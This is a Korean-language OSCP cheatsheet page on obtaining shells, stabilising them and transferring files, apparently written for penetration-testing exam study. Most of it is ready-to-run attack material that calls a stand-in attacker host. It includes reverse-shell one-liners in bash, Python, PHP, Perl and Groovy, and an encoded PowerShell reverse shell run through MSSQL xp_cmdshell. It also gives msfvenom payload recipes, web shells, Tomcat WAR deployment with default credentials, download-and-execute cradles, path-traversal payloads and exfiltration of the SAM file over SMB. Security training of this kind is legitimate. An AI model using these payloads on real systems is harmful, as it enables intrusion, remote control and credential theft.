---
title: "쉘 & 파일 전송 (Shells & Transfers)"
date: 2026-06-20
weight: 60
draft: false
tags: ["oscp", "cheatsheet"]
summary: "셸 획득, 안정화, 파일 전송, 익스플로잇 실행까지의 기본 워크플로."
---

셸 획득, 파일 전송, 익스플로잇 워크플로 레퍼런스.

- 출처: https://heretek.dev/oscp-cheatsheet/shells-and-transfers/ (Jean Romero) — 재구성
- 변수: `$TARGET` = 공격 대상, `$KALI` = 공격자(Kali) IP (본문의 `ATTACKER`, `YOUR_IP` 도 공격자 IP)

## Searchsploit과 익스플로잇 워크플로

### 익스플로잇 찾기

```bash
searchsploit <service> <version>        # 정확히 일치
searchsploit <service>                  # 더 넓게 — 정확한 버전으로 안 나오면
searchsploit -m <exploit-path>          # 익스플로잇을 현재 디렉터로 복사
searchsploit -p <exploit-id>            # 전체 경로 표시
searchsploit -u                         # DB 업데이트
```

팁: 넓게 찾고 좁힌다. `Apache 2.4.49` 로 안 나오면 `Apache 2.4` 로. 항상 Google 도 함께: `<service> <version> exploit github`.

### 실행 전 확인

- 코드를 읽는다 — 무엇을 하는지 이해한다
- 변수를 확인한다 — 상단에 하드코딩된 IP, 포트, 경로, 사용자명이 있는지 본다
- 타깃을 확인한다 — 정확한 버전과 아키텍처(32/64비트)에 맞는지 본다
- 실행 전에 리스너를 띄워둔다
- 익스플로잇이 실패하면 — 에러 출력을 읽고, 아키텍처를 확인하고, GitHub 의 다른 PoC 를 시도한다

### 익스플로잇 컴파일

```bash
# Linux 용 C
gcc exploit.c -o exploit
gcc -m32 exploit.c -o exploit            # 32-bit
gcc exploit.c -o exploit -static         # static (타깃에서 의존성 문제 없음)

# Windows 용 C (Kali 에서 크로스컴파일)
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe       # 64-bit
i686-w64-mingw32-gcc exploit.c -o exploit.exe          # 32-bit
# Winsock 을 쓰는 네트워크 익스플로잇(socket, connect, send, recv)은 -lws2_32 가 필요:
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
# WSAStartup/socket/connect 에 undefined reference 가 나오면 → -lws2_32 추가

# Python — 그냥 실행
python3 exploit.py
pip install <missing-module>             # 의존성이 빠졌으면
```

## 리버스 셸

### Windows PowerShell 원라이너 (가장 좋은 방법)

1. revshells.com 에서 PowerShell #2 를 가져온다 — 따옴표 없는 부분("copy this" 표시)만 복사하는 게 중요
2. cyberchef.com 으로 간다
3. 사용할 리버스 셸을 붙여넣는다
4. 'encode text' 를 고르고 Encoding 은 'UTF-16LE (1200)' 로
5. base64 로 인코딩
6. 출력을 복사해 붙여넣는다

리스너는 먼저 띄워둔다:

```bash
rlwrap nc -lvnp 4444           # basic (rlwrap 을 쓰면 방향키가 먹는다)

# Socat stable TTY (타깃에 socat 이 있으면 가장 좋은 품질의 셸)
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444
```

### MSSQL에서 리버스 셸 (가장 좋은 방법)

```text
SQL (SIGNED\Administrator dbo@master)> EXEC xp_cmdshell 'powershell -exec -bypass -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAzADcAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

### Linux 셸

```bash
bash -c 'bash -i >& /dev/tcp/$KALI/4444 0>&1'

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("ATTACKER",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $KALI 4444 >/tmp/f

# Perl
perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Windows 셸 — 단계별 (이 순서로 시도)

황금 규칙: quoting 과 싸우지 않는다. 파일을 올리고 실행한다. `C:\Windows\Temp\` 은 항상 존재한다. `C:\Temp\` 는 흔히 없다. 4444 가 막혔으면 80 이나 443 — 방화벽은 웹 포트를 열어둔다.

1단계: nc.exe 업로드 (한 가지 방법을 고른다)

```bash
# From Kali — nc.exe 를 호스팅
cp /usr/share/windows-resources/binaries/nc.exe . && python3 -m http.server 80

# 타깃에서 — 다운로드 (하나가 될 때까지 순서대로 시도)
certutil -urlcache -f http://YOUR_IP/nc.exe C:\Windows\Temp\nc.exe
powershell -c "curl http://YOUR_IP/nc.exe -o C:/Windows/Temp/nc.exe"
powershell -c "(New-Object Net.WebClient).DownloadFile('http://YOUR_IP/nc.exe','C:\Windows\Temp\nc.exe')"
```

2단계: Kali 에서 리스너

```bash
rlwrap nc -nlvp 80
# 4444 가 막혔으면 80 이나 443 사용
```

3단계: 타깃에서 nc.exe 실행

```bash
C:\Windows\Temp\nc.exe YOUR_IP 80 -e cmd.exe
```

nc.exe 가 안 되면 PowerShell base64 (quoting 문제 없음):

```bash
# Kali 에서 — base64 인코딩된 리버스 셸 생성
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=80 -f psh -o shell.ps1
cat shell.ps1 | iconv -t UTF-16LE | base64 -w 0

# 출력을 복사
# 타깃에서 — 실행 (한 줄 문자열, 깨질 따옴표 없음)
powershell -e <BASE64>
```

PowerShell 다운로드 cradle 이 필요하면:

```bash
# quoting 패턴: 바깥은 작은따옴표, 안은 큰따옴표
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')"
```

Python/Ruby 익스플로잇에 주입할 때 (-c 플래그):

```bash
# WRONG — Windows 에는 bash 가 없다
-c "bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'"

# RIGHT — PowerShell base64 사용 (quoting 충돌 없음)
-c 'powershell -e '

# RIGHT — nc.exe 사용 (quoting 충돌 없음)
-c 'C:\Windows\Temp\nc.exe YOUR_IP 80 -e cmd.exe'

# RIGHT — 다운로드 후 실행 (바깥 작은따옴표, 안 큰따옴표)
-c 'powershell -c "curl http://YOUR_IP/nc.exe -o C:/Windows/Temp/nc.exe"'
-c 'C:\Windows\Temp\nc.exe YOUR_IP 80 -e cmd.exe'
```

AV 가 페이로드를 잡으면:

- msfvenom psh 페이로드 → Defender 에 잘 잡힌다
- nc.exe → 잘 안 잡힌다
- msfvenom exe → 가끔 잡힌다 → exe-service 를 시도하거나 Metasploit handler 사용
- Metasploit → exploit/multi/handler 사용 (eCPPT 에서는 제한 없음)

Windows 셸 결정 트리:

```text
Windows 리버스 셸이 필요한가?
│
├── 파일 업로드 가능?        → nc.exe (항상 이것부터)
│
├── PowerShell 실행 가능?    → powershell -e <BASE64>
│
├── 익스플로잇에 주입?       → -c 'powershell -e '
│                              → 또는: -c 'C:\Windows\Temp\nc.exe IP PORT -e cmd'
│
├── AV 가 전부 막음?         → Metasploit (eCPPT 에서는 제한 없음)
│
└── 포트가 막힘?             → 4444 대신 80 이나 443
```

뼈저린 교훈:

1. `C:\Temp` 는 없을 수 있다. `C:\Windows\Temp` 는 항상 있다.
2. 4444 가 막혔으면 80 이나 443 을 시도한다.
3. certutil 이 막혔으면: `powershell -c "curl http://IP/file -o C:/Windows/Temp/file"`
4. msfvenom psh 페이로드는 AV 에 잡힌다. nc.exe 는 보통 안 잡힌다.
5. quoting: 바깥 작은따옴표, 안 큰따옴표.
6. Windows 에는 /bin/bash 가 없다. Windows 익스플로잇에 Linux 페이로드를 주입하지 않는다.

### msfvenom 페이로드 매트릭스

- Linux ELF: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f elf -o shell.elf`
- Windows EXE: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o shell.exe`
- Windows DLL: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll -o shell.dll`
- MSI: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi -o shell.msi`
- ASP: `msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f asp -o shell.asp`
- ASPX: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f aspx -o shell.aspx`
- JSP: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f raw -o shell.jsp`
- WAR: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f war -o shell.war`
- PHP: `msfvenom -p php/reverse_php LHOST=ATTACKER LPORT=4444 -f raw -o shell.php`
- HTA: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f hta-psh -o shell.hta`
- nc.exe 대안: `C:\temp\nc.exe ATTACKER 4444 -e cmd.exe`

### Groovy 리버스 셸 (Jenkins Script Console)

```text
String host="ATTACKER";int port=4444;String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();
```

Linux Jenkins 라면 cmd.exe 를 /bin/bash 로 바꾼다.

### Tomcat WAR 셸 배포

Tomcat Manager 크리덴셜이 있으면 (tomcat:s3cret, admin:admin 을 시도):

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f war -o shell.war
curl -u 'tomcat:s3cret' --upload-file shell.war "http://$ip:8080/manager/text/deploy?path=/shell"
curl http://$ip:8080/shell/    # 리버스 셸 발화
```

### 웹 셸

PHP:

```text
<?php system($_GET['cmd']); ?>
```

ASP:

```text
<% Set o = Server.CreateObject("WSCRIPT.SHELL") : Set x = o.exec("cmd /c " & Request("cmd")) : Response.Write x.StdOut.ReadAll %>
```

JSP:

```text
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

### 쉘 업그레이드 (Linux — 착지하면 즉시)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Ctrl+Z (백그라운드로)
stty raw -echo; fg

# Enter 를 두 번 누른다
export TERM=xterm-256color
stty rows 50 cols 200
```

Windows: 셸을 받을 때는 `rlwrap nc -lvnp 4444` 를 쓴다.

## 파일 전송

### Linux 타깃

```bash
# HTTP (가장 흔함 — 공격자: python3 -m http.server 80)
wget http://ATTACKER/file -O /tmp/file
curl http://ATTACKER/file -o /tmp/file

# 디스크에 남기지 않고 실행
curl http://ATTACKER/linpeas.sh | bash

# wget/curl 이 없을 때
cat < /dev/tcp/ATTACKER/80 > file.txt

# Netcat (공격자: nc -lvnp 9999 < file)
nc ATTACKER 9999 > file

# SCP (SSH 접근이 있을 때)
scp user@ATTACKER:/path/file /tmp/file
```

### Windows 타깃

```bash
certutil -urlcache -split -f http://ATTACKER/file.exe C:\Users\Public\file.exe

# PowerShell
iwr -uri http://ATTACKER/file.exe -outfile file.exe
(New-Object System.Net.WebClient).DownloadFile('http://ATTACKER/file.exe','C:\Users\Public\file.exe')

# 메모리에서 바로 실행 (PowerShell)
IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKER/script.ps1')

# Bitsadmin (certutil/PS 가 막혔을 때)
bitsadmin /transfer job /download /priority high http://ATTACKER/file.exe C:\Users\Public\file.exe
```

### SSH 연결 문제 해결 (ARM64 Kali / Parallels)

SSH 가 키 교환에서 멈추면 (debug 가 "expecting SSH2_MSG_KEX_ECDH_REPLY" 를 보여줌):

```bash
# 수정: 다른 키 교환 알고리즘을 강제
ssh -i key user@target -p PORT -o KexAlgorithms=curve25519-sha256

# 로그인 후 셸이 멈추면 대화형 bash 를 강제
ssh -i key user@target -p PORT -o KexAlgorithms=curve25519-sha256 -t "bash -i"

# 조합: 포트 포워딩 + 정상 셸 + kex 수정
ssh -i key user@target -p PORT -o KexAlgorithms=curve25519-sha256 -t "bash -i" -L 8080:127.0.0.1:8080
```

### SMB 서버 (Windows 에 가장 좋음 — 업로드와 다운로드 모두)

항상 `-user` 와 `-password` 를 붙인다. 최신 Windows(Win10/11, Server 2019+)는 익명 SMB 를 막는다 — 'organization's policies block unauthenticated guest access'. 크리덴셜 없는 익명 SMB 는 조용히 실패하거나 에러가 난다.

`net use` 도 실패하면 전송 방향을 뒤집는다: Windows 타깃에서 `python3 -m http.server 8888` 을 띄우고 Kali 에서 `wget` 으로 받는다.

```bash
# 공격자:
impacket-smbserver smb $(pwd) -smb2support -user test -password test

# Windows 타깃:
net use \\$KALI\smb /user:test test
copy \\$KALI\smb\file.exe .
copy C:\sam \\$KALI\smb\sam    # 빼내기(exfiltrate)
net use \\ATTACKER\smb /delete
```

### Base64 전송 (모든 게 막혔을 때)

```bash
# Kali 에서 인코딩:
base64 -w 0 file.bin | xclip -selection clipboard

# Linux 타깃에서 디코딩:
echo 'BASE64STRING' | base64 -d > file.bin

# Windows 타깃에서 디코딩 (PowerShell):
[IO.File]::WriteAllBytes("C:\temp\file.exe",[Convert]::FromBase64String("BASE64STRING"))
```

## 피벗 호스트에서 포트 스캔 (nmap 이 없을 때)

### Windows 에서

```powershell
# 단일 포트 테스트
Test-NetConnection -Port 445 10.10.10.5

# 호스트의 흔한 포트 스캔
@(21,22,80,135,139,445,1433,3389,5985) | % { $r = Test-NetConnection 10.10.10.5 -Port $_ -WarningAction SilentlyContinue; if($r.TcpTestSucceeded){"Port $_ OPEN"} }

# 서브넷을 특정 포트로 스윕
1..254 | % { Test-NetConnection "10.10.10.$_" -Port 445 -WarningAction SilentlyContinue -InformationLevel Quiet }
```

### Linux 에서 (도구 없음)

```bash
# Bash TCP scan
for port in 21 22 80 443 445 3389 5985; do (echo >/dev/tcp/10.10.10.5/$port) 2>/dev/null && echo "Port $port OPEN"; done

# Ping sweep
for i in $(seq 1 254); do (ping -c 1 -W 1 10.10.10.$i | grep "bytes from" &); done; wait
```

## Python2 익스플로잇을 Python3 용으로 고치기

searchsploit 익스플로잇 대부분은 Python2 다. Python3 에서는 반드시 크래시가 난다. 빠르게 고치는 방법:

- `print "hello"` → `print("hello")` — print 가 함수가 됨
- `print "Status: %s" % var` → `print("Status: %s" % var)` — 괄호만 붙이면 됨
- `raw_input("Enter: ")` → `input("Enter: ")` — raw_input 제거됨
- `except Exception, e:` → `except Exception as e:` — 콤마 문법 제거됨
- `urllib2.urlopen(url)` → `urllib.request.urlopen(url)` — urllib2 가 urllib 로 흡수됨
- `"string" + bytes_var` → `"string" + bytes_var.decode()` — str/bytes 가 별개 타입
- `socket.send("cmd")` → `socket.send(b"cmd")` — 소켓은 str 이 아니라 bytes 를 받는다
- `data = "A" * 100` (익스플로잇 버퍼) → `data = b"A" * 100` — 바이너리 페이로드에는 `b""` 를 쓴다
- `xrange(100)` → `range(100)` — xrange 제거됨
- `dict.iteritems()` → `dict.items()` — iteritems 제거됨
- `dict.has_key('x')` → `'x' in dict` — has_key 제거됨

빠른 수정 워크플로:

```bash
# Step 1: 일단 실행해 본다
python3 exploit.py 2>&1 | head -5

# Step 2: print 에서 SyntaxError 면 sed 로 빠르게 수정
sed -i 's/^\(\s*\)print \(.*\)$/\1print(\2)/' exploit.py
# ⚠️ 대부분의 경우를 처리하지만 결과를 반드시 확인 — 복잡한 print 는 수동 수정이 필요할 수 있다

# Step 3: Python2 가 꼭 필요하고 수정이 너무 많으면
# Kali 에는 Python2 가 있거나 설치한다:
sudo apt install python2
python2 exploit.py
```

최후 수단: 고치기 너무 지저분하면 GitHub 에서 Python3 재작성본을 검색한다: `<CVE number> python3 exploit github`

## 쉘 규율 (시험에서 중요)

### 문제

블로킹 리버스 셸(pentestmonkey, Ivan Sincek PHP 셸)은 웹 서버를 멈추게 할 수 있다. 브라우저로 트리거했는데 연결이 깔끔히 닫히지 않으면 PHP 프로세스가 Apache 워커를 영원히 잡아둔다. Prefork MPM 워커 10개 환경에서는 실패한 셸이 10개면 워커 전부가 T 상태로 고인다. 관리자만 이를 죽일 수 있다.

### 규칙

- 리버스 셸을 브라우저로 트리거하지 않는다 — curl 을 쓴다
- 블로킹 셸보다 커맨드 익스큐터 + 백그라운드 셸을 선호한다
- 셸이 죽었으면 nc 에서 Ctrl+C 말고 exit 를 입력한다
- 첫 시도가 돌아오지 않았으면 같은 셸 URL 을 두 번 치지 않는다
- 셸을 잡으면 즉시 안정화한다

### 선호 패턴: 커맨드 익스큐터 + 백그라운드 셸

아주 작은 논블로킹 PHP 셸을 떨군다: `<?php system($_GET['cmd']); ?>`

리버스 셸은 curl 에 백그라운드를 붙여 트리거한다:

```text
curl 'http://TARGET/cmd.php?cmd=nohup+bash+-c+%22bash+-i+%3E%26+/dev/tcp/KALI/4444+0%3E%261%22+%26'
```

마지막의 `&` 가 Apache 워커에서 분리한다. 워커는 즉시 반환되고, 셸은 독립 프로세스로 돈다.

트리거 예시:

```text
curl -s http://$TARGET/request.php
curl -s "http://$TARGET/index.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
curl -s "http://$TARGET/index.php?file=….//….//….//etc/passwd"
curl -sG "http://$TARGET/index.php" \
  --data-urlencode "file=simple_shell.php" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$KALI/443 0>&1'"
curl -sG "http://$TARGET/index.php" \
  --data-urlencode "file=simple_shell.php" \
  --data-urlencode "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$KALI",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'"
curl -sG "http://$TARGET/index.php" \
  --data-urlencode "file=simple_shell.php" \
  --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $KALI 443 >/tmp/f"
```

### Windows (aspx)

원라이너 aspx 커맨드 익스큐터:

```text
<%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["c"]){RedirectStandardOutput=true,UseShellExecute=false}).StandardOutput.ReadToEnd()); %>
```

트리거:

```text
curl 'http://TARGET/shell.aspx?c=whoami'
```

이후 nc.exe 를 받아서 실제 셸로 올라간다:

```text
curl 'http://TARGET/shell.aspx?c=powershell+-c+iwr+http://KALI/nc.exe+-o+C:\Windows\Temp\nc.exe'
curl 'http://TARGET/shell.aspx?c=C:\Windows\Temp\nc.exe+KALI+4444+-e+cmd.exe'
```

### 셸을 잡은 후: 안정화

Linux:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Ctrl+Z
stty raw -echo; fg

export TERM=xterm SHELL=bash

# rows/cols 리셋: stty rows 50 cols 200
```

Windows: 크리덴셜을 확보했다면 evil-winrm 이나 rdp 를 쓴다. raw nc 셸은 한계를 감수하거나 powershell 로 업그레이드한다.

- 증상: Apache 가 80 에서 리스닝 중인데 요청이 멈춘다. ps 를 보면 httpd 워커 여러 개가 T 상태다.
- 원인: 블로킹 PHP 리버스 셸이 쌓이면서 각각 워커를 하나씩 잡고 있다.
- 복구: 프로세스를 죽이려면 root 가 필요하다. root 가 없으면 박스를 revert 한다.
- 예방: 위의 커맨드 익스큐터 패턴을 쓴다. 백그라운드 분리 후 워커는 즉시 반환된다.
